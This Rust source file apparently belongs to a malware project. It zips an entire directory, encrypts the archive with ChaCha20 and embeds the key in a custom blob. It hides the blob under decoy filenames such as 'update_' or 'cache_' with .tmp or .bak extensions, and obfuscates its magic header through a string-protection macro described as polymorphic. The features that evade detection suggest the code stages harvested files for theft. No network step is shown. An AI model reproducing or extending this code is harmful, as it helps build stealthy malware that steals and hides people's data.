use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
use rand::Rng;
use std::fs;
use std::io::Write;
use zip::write::{FileOptions, ZipWriter};
use zip::CompressionMethod;
use crate::sprotect;

/// Custom encrypted blob format with FIXED OFFSETS
/// Structure is hardcoded, but content is polymorphic via pycrypt
///
/// BLOB LAYOUT (Fixed Offsets):
/// ┌─────────────────────────────────────────┐
/// │ Offset 0:  MAGIC (8 bytes) - polymorphic │
/// │ Offset 8:  VERSION (2 bytes) - 0x0001    │
/// │ Offset 10: ENCRYPTION_KEY (32 bytes)     │
/// │ Offset 42: NONCE (12 bytes)              │
/// │ Offset 54: ZIP_PWD_LEN (2 bytes)         │
/// │ Offset 56: ZIP_PASSWORD (N bytes)        │
/// │ Offset 56+N: PADDING (to 128 bytes)      │
/// │ Offset 128: ENCRYPTED_ZIP_DATA (rest)    │
/// └─────────────────────────────────────────┘

//#ultraprotect(name="MAGIC_HEADER", value="RVNBLOB1")
lazy_static::lazy_static! {
    pub static ref MAGIC_HEADER: String = sprotect!("RVNBLOB1");
}
//#endultra()

const VERSION: u16 = 0x0001;
const HEADER_SIZE: usize = 128;

// Fixed offsets (NEVER CHANGE - decryptor relies on these!)
const OFFSET_MAGIC: usize = 0;
const OFFSET_VERSION: usize = 8;
const OFFSET_KEY: usize = 10;
const OFFSET_NONCE: usize = 42;
const OFFSET_PWD_LEN: usize = 54;
const OFFSET_PASSWORD: usize = 56;
const OFFSET_DATA: usize = 128;

/// Create encrypted blob with embedded key
pub fn create_encrypted_blob(directory: &str) -> Result<(Vec<u8>, String), String> {
    // Step 1: Generate random encryption key (32 bytes for ChaCha20)
    let mut encryption_key = [0u8; 32];
    rand::thread_rng().fill(&mut encryption_key);
    
    // Step 2: Generate random nonce (12 bytes for ChaCha20)
    let mut nonce = [0u8; 12];
    rand::thread_rng().fill(&mut nonce);
    
    // Step 3: Generate random ZIP password (placeholder - not used in v1)
    let zip_password = generate_random_password(16);
    
    // Step 4: Create regular ZIP (no password for now - ChaCha20 encryption is enough)
    let zip_data = create_zip_no_password(directory)?;
    
    // Step 5: Encrypt ZIP data with ChaCha20
    let encrypted_zip = encrypt_data(&zip_data, &encryption_key, &nonce)?;
    
    // Step 6: Build custom blob format
    let blob = build_blob_format(&encryption_key, &nonce, &zip_password, &encrypted_zip)?;
    
    // Step 7: Generate random filename
    let filename = generate_random_filename();
    
    Ok((blob, filename))
}

/// Build custom blob format with FIXED OFFSETS
fn build_blob_format(
    key: &[u8; 32],
    nonce: &[u8; 12],
    zip_password: &str,
    encrypted_data: &[u8]
) -> Result<Vec<u8>, String> {
    // Create header buffer (128 bytes) - initialized with random data
    let mut header = vec![0u8; HEADER_SIZE];
    for byte in header.iter_mut() {
        *byte = rand::random::<u8>();
    }
    
    // Offset 0: Magic header (8 bytes) - polymorphic via pycrypt
    let magic_bytes = MAGIC_HEADER.as_bytes();
    let magic_len = magic_bytes.len().min(8);
    header[OFFSET_MAGIC..OFFSET_MAGIC + magic_len].copy_from_slice(&magic_bytes[..magic_len]);
    
    // Offset 8: Version (2 bytes)
    header[OFFSET_VERSION..OFFSET_VERSION + 2].copy_from_slice(&VERSION.to_le_bytes());
    
    // Offset 10: Encryption key (32 bytes)
    header[OFFSET_KEY..OFFSET_KEY + 32].copy_from_slice(key);
    
    // Offset 42: Nonce (12 bytes)
    header[OFFSET_NONCE..OFFSET_NONCE + 12].copy_from_slice(nonce);
    
    // Offset 54: ZIP password length (2 bytes)
    let pwd_len = zip_password.len() as u16;
    header[OFFSET_PWD_LEN..OFFSET_PWD_LEN + 2].copy_from_slice(&pwd_len.to_le_bytes());
    
    // Offset 56: ZIP password (N bytes, max 72 to fit in header)
    let pwd_bytes = zip_password.as_bytes();
    let pwd_copy_len = pwd_bytes.len().min(HEADER_SIZE - OFFSET_PASSWORD);
    header[OFFSET_PASSWORD..OFFSET_PASSWORD + pwd_copy_len].copy_from_slice(&pwd_bytes[..pwd_copy_len]);
    
    // Remaining bytes (56+N to 128) are already random padding
    
    // Combine header + encrypted data
    let mut blob = Vec::with_capacity(HEADER_SIZE + encrypted_data.len());
    blob.extend_from_slice(&header);
    blob.extend_from_slice(encrypted_data);
    
    Ok(blob)
}

/// Parse blob format and decrypt using FIXED OFFSETS
pub fn parse_and_decrypt_blob(blob: &[u8]) -> Result<(String, Vec<u8>), String> {
    // 1. Verify minimum size
    if blob.len() < OFFSET_DATA {
        return Err("Blob too small".to_string());
    }
    
    // 2. Extract magic header (offset 0, 8 bytes) - we don't verify it since it's polymorphic
    // Just check version instead
    
    // 3. Verify version (offset 8, 2 bytes)
    let version = u16::from_le_bytes([blob[OFFSET_VERSION], blob[OFFSET_VERSION + 1]]);
    if version != VERSION {
        return Err(format!("Unsupported version: {}", version));
    }
    
    // 4. Extract encryption key (offset 10, 32 bytes)
    let mut encryption_key = [0u8; 32];
    encryption_key.copy_from_slice(&blob[OFFSET_KEY..OFFSET_KEY + 32]);
    
    // 5. Extract nonce (offset 42, 12 bytes)
    let mut nonce = [0u8; 12];
    nonce.copy_from_slice(&blob[OFFSET_NONCE..OFFSET_NONCE + 12]);
    
    // 6. Extract ZIP password length (offset 54, 2 bytes)
    let pwd_len = u16::from_le_bytes([blob[OFFSET_PWD_LEN], blob[OFFSET_PWD_LEN + 1]]) as usize;
    
    // 7. Extract ZIP password (offset 56, N bytes)
    if OFFSET_PASSWORD + pwd_len > HEADER_SIZE {
        return Err("Invalid password length".to_string());
    }
    let zip_password = String::from_utf8(blob[OFFSET_PASSWORD..OFFSET_PASSWORD + pwd_len].to_vec())
        .map_err(|_| "Invalid ZIP password encoding")?;
    
    // 8. Extract encrypted data (offset 128 to end)
    let encrypted_data = &blob[OFFSET_DATA..];
    
    // 9. Decrypt data
    let zip_data = decrypt_data(encrypted_data, &encryption_key, &nonce)?;
    
    Ok((zip_password, zip_data))
}

/// Encrypt data with ChaCha20
fn encrypt_data(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Result<Vec<u8>, String> {
    let mut encrypted = data.to_vec();
    let mut cipher = ChaCha20::new(key.into(), nonce.into());
    cipher.apply_keystream(&mut encrypted);
    Ok(encrypted)
}

/// Decrypt data with ChaCha20
fn decrypt_data(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Result<Vec<u8>, String> {
    // ChaCha20 encryption/decryption is symmetric
    encrypt_data(data, key, nonce)
}

/// Generate random password
fn generate_random_password(length: usize) -> String {
    use rand::distributions::Alphanumeric;
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(length)
        .map(char::from)
        .collect()
}

/// Create regular ZIP (no password)
fn create_zip_no_password(directory: &str) -> Result<Vec<u8>, String> {
    let mut zip_buffer = Vec::new();
    
    {
        let mut zip = ZipWriter::new(std::io::Cursor::new(&mut zip_buffer));
        let options = FileOptions::default()
            .compression_method(CompressionMethod::Deflated)
            .unix_permissions(0o755);
        
        for entry in walkdir::WalkDir::new(directory)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
        {
            let path = entry.path();
            let name = path.strip_prefix(directory)
                .unwrap_or(path)
                .to_string_lossy()
                .to_string();
            
            zip.start_file(name, options)
                .map_err(|e| format!("ZIP error: {}", e))?;
            
            let contents = fs::read(path)
                .map_err(|e| format!("Read error: {}", e))?;
            zip.write_all(&contents)
                .map_err(|e| format!("Write error: {}", e))?;
        }
        
        zip.finish().map_err(|e| format!("Finish error: {}", e))?;
    }
    
    Ok(zip_buffer)
}

/// Generate random filename
fn generate_random_filename() -> String {
    use rand::distributions::Alphanumeric;
    
    let prefixes = ["update", "cache", "temp", "data", "backup", "log"];
    let extensions = ["dat", "tmp", "bin", "cache", "bak"];
    
    let mut rng = rand::thread_rng();
    let prefix = prefixes[rng.gen_range(0..prefixes.len())];
    let ext = extensions[rng.gen_range(0..extensions.len())];
    let random: String = rand::thread_rng().sample_iter(&Alphanumeric).take(8).map(char::from).collect();
    
    format!("{}_{}.{}", prefix, random, ext)
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_blob_format() {
        let key = [0x42u8; 32];
        let nonce = [0x13u8; 12];
        let password = "test123";
        let data = b"Hello World";
        
        let encrypted = encrypt_data(data, &key, &nonce).unwrap();
        let blob = build_blob_format(&key, &nonce, password, &encrypted).unwrap();
        
        // Verify we can parse it back
        let (parsed_pwd, decrypted_data) = parse_and_decrypt_blob(&blob).unwrap();
        assert_eq!(parsed_pwd, password);
        assert_eq!(decrypted_data, data);
    }
}
